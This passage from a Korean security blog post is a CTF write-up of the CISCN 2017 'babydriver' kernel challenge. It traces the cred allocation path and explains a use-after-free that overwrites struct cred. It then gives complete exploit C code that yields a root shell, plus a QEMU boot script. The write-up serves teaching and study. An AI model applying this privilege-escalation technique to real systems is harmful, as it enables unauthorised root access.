class="keyword">endif</span></span></span><br><span class="line">		clone_flags &amp; CLONE_THREAD</span><br><span class="line">	    ) &#123;</span><br><span class="line">		p-&gt;real_cred = get_cred(p-&gt;cred);</span><br><span class="line">		get_cred(p-&gt;cred);</span><br><span class="line">		alter_cred_subscribers(p-&gt;cred, <span class="number">2</span>);</span><br><span class="line">		kdebug(<span class="string">&quot;share_creds(%p&#123;%d,%d&#125;)&quot;</span>,</span><br><span class="line">		       p-&gt;cred, <span class="type">atomic_read</span>(&amp;p-&gt;cred-&gt;usage),</span><br><span class="line">		       read_cred_subscribers(p-&gt;cred));</span><br><span class="line">		<span class="type">atomic_inc</span>(&amp;p-&gt;cred-&gt;user-&gt;processes);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	new = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	<span class="keyword">if</span> (clone_flags &amp; CLONE_NEWUSER) &#123;</span><br><span class="line">		ret = create_user_ns(new);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error_put;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><code>copy_creds()</code> 함수이다.</p>
+<p>이 함수 내부에서는 <code>prepare_creds()</code> 함수를 호출한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	validate_process_creds();</span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, new);</span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(new, old, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred));</span><br><span class="line">	<span class="type">atomic_set</span>(&amp;new-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(new, <span class="number">0</span>);</span><br><span class="line">	get_group_info(new-&gt;group_info);</span><br><span class="line">	get_uid(new-&gt;user);</span><br><span class="line">	get_user_ns(new-&gt;user_ns);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><code>prepare_creds()</code> 함수 내부에서는 <code>kmem_Cache_alloc()</code> 함수를 호출한다. 위에서부터 함수 내부로 계속해서 들어왔더니 아래의 순서대로 호출된다.</p>
+<p><code>fork()</code> → <code>clone()</code> → <code>do_fork()</code> → <code>copy_process()</code> → <code>copy_creds()</code> → <code>prepare_creds()</code> → <code>kmem_cache_alloc()</code><br>&#96;<br><br></p>
+<h3 id="4-3-6-Exploit"><a href="#4-3-6-Exploit" class="headerlink" title="4.3.6. Exploit"></a>4.3.6. Exploit</h3><p><code>fork()</code> 함수를 호출하면 기존 <code>cred</code>를 복사할 공간이 필요하다.</p>
+<p><code>cred</code> 구조체의 크기는 168 바이트이다.</p>
+<ol>
+<li><code>open()</code> 함수를 2번 호출하여 힙을 할당</li>
+<li><code>babyioctl()</code> 함수를 호출하여 168 바이트 만큼 재할당</li>
+<li><code>close()</code> 함수를 호출하여 힙을 해제(<code>free</code>)</li>
+<li><code>fork()</code> 함수 호출</li>
+<li><code>write()</code> 함수를 호출하여 <code>struct cred</code> 값 변경</li>
+</ol>
+<p>3번까지 진행하면 전역변수의 값은 Dangling Pointer가 된다.</p>
+<p>그 후 4번을 진행하면 해제 한 힙 영역에 <code>struct cred</code>가 할당되고, Dangling Pointer는 할당된 168 바이트 힙 영역을 가리키게 된다.</p>
+<p>5번이 진행되면 <code>write()</code> 함수를 호출하여 <code>struct cred</code>를 0으로 수정 후 <code>system(”/bin/sh”)</code> 함수를 호출하면 root 권한의 쉘을 획득하게 된다.</p>
+<br>
+
+<h3 id="4-3-7-Exploit-code"><a href="#4-3-7-Exploit-code" class="headerlink" title="4.3.7. Exploit code"></a>4.3.7. Exploit code</h3><p><code>exploit.c</code>는 다음과 같다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMAND 0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> f1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> f2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(f1, COMMAND, <span class="number">168</span>);</span><br><span class="line">    close(f1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> fake_cred[<span class="number">30</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line">        write(f2, fake_cred, <span class="number">28</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(f2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>익스의 성공 여부를 확인하기 위해 <code>boot.sh</code> 파일을 아래와 같이 수정해주었다.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">gcc exploit.c -static -o rootfs/exploit</span><br><span class="line"></span><br><span class="line"><span class="built_in">pushd</span> rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -moni</span><br><span class="line">tor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
+
+<p><code>./boot.sh를</code> 실행한 뒤, <code>./exploit</code>을 실행하면 LPE가 성공한 것을 확인할 수 있다.</p>
+<p><img src="/images/monthly_24_05_image7.png" alt="그림 7. [LPE를 통한 root 권한 획득]"></p>
+<center><b>그림 7. [LPE를 통한 root 권한 획득]<br></center></b><br>
+
+<p><br><br></p>
+<h1 id="5-마무리하며"><a href="#5-마무리하며" class="headerlink" title="5. 마무리하며"></a>5. 마무리하며</h1><p>이번 CTF 문제를 해결하면서 커널에서 발생하는 Use-After-Free (UAF) 취약점의 심각성과 이를 악용하는 방법에 대해 이해할 수 있었다. 문제 해결 과정에서 메모리 할당 및 해제 관리가 얼마나 중요한지, 그리고 작은 부주의가 어떻게 심각한 보안 위협으로 이어질 수 있는지를 확인할 수 있었다.</p>
+<p>앞으로 커널 보안에 대한 깊이 있는 이해를 위해 커널 구조와 메모리 관리, 동기화 메커니즘 등을 심도 있게 공부하며 리눅스 커널 소스 코드를 분석해보는 것도 좋은 방법이 될 수 있다. </p>
+<p><br><br></p>
+<h1 id="6-참고문헌"><a href="#6-참고문헌" class="headerlink" title="6. 참고문헌"></a>6. 참고문헌</h1><p>[1] [Heap Exploit] UAF(Use After Free) 기법 이론설명. (N.d.).<br><span class="exturl" data-url="aHR0cHM6Ly9kb2toYWtkdWJpbmkudGlzdG9yeS5jb20vMzU=">https://dokhakdubini.tistory.com/35</span></p>
+<p>[2] Use After Free (UAF) 너 뭐임?. (N.d.).<br><span class="exturl" data-url="aHR0cHM6Ly9zZWNsYWI2MTQudGlzdG9yeS5jb20vMw==">https://seclab614.tistory.com/3</span></p>
+<p>[3] Kernel (6) - CISCN 2017 babydriver write-up (Linux kernel UAF). (N.d.).<br><span class="exturl" data-url="aHR0cHM6Ly9zdW5yaW5qdW50YWUudGlzdG9yeS5jb20vMTMw">https://sunrinjuntae.tistory.com/130</span> </p>
+<p>[4] 까망눈 연구소. (N.d.).<br><span class="exturl" data-url="aHR0cHM6Ly9qZW9uZ3plcm8ub29weS5pby8=">https://jeongzero.oopy.io/</span></p>
+<p>[5] [Linux] QEMU 가상머신에 OS 설치하기. (N.d.).<br><span class="exturl" data-url="aHR0cHM6Ly9zdGFja2ZyYW1lLnRpc3RvcnkuY29tLzI4">https://stackframe.tistory.com/28</span> </p>
+<p>[6] [CISCN CTF 2017] babydriver (kernel exploit, kUAF). (N.d.).<br><span class="exturl" data-url="aHR0cHM6Ly9rb2hhcmlubi50aXN0b3J5LmNvbS81NjEjZ29vZ2xlX3ZpZ25ldHRl">https://koharinn.tistory.com/561#google_vignette</span> </p>
+<p>[7] [Linux Kernel] CISCN 2017 babydriver. (N.d.).<br><span class="exturl" data-url="aHR0cHM6Ly9hcHBsZW1hc3RlcnoxNy50aXN0b3J5LmNvbS8yMjk=">https://applemasterz17.tistory.com/229</span></p>
+<p>[8] [CISCN CTF 2017] babydriver. (N.d.).<br><span class="exturl" data-url="aHR0cDovL2lwd24ua3IvaW5kZXgucGhwLzIwMjAvMDQvMDUvY2lzY24tY3RmLTIwMTctYmFieWRyaXZlci8=">http://ipwn.kr/index.php/2020/04/05/ciscn-ctf-2017-babydriver/</span></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/System-Hacking/" rel="tag"># System Hacking</a>
+              <a href="/tags/Kernel/" rel="tag"># Kernel</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/04/30/monthly_24_04/" rel="prev" title="클라우드와 포렌식">
+                  <i class="fa fa-angle-left"></i> 클라우드와 포렌식
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/04/03/3101_250402/" rel="next" title="지원서 뜯어보기 [상] CVE-2024-27956 분석">
+                  지원서 뜯어보기 [상] CVE-2024-27956 분석 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy;
+    
+      2024 – <span itemprop="copyrightYear">2026</span>
+    
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">SWING</span>
+  </div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
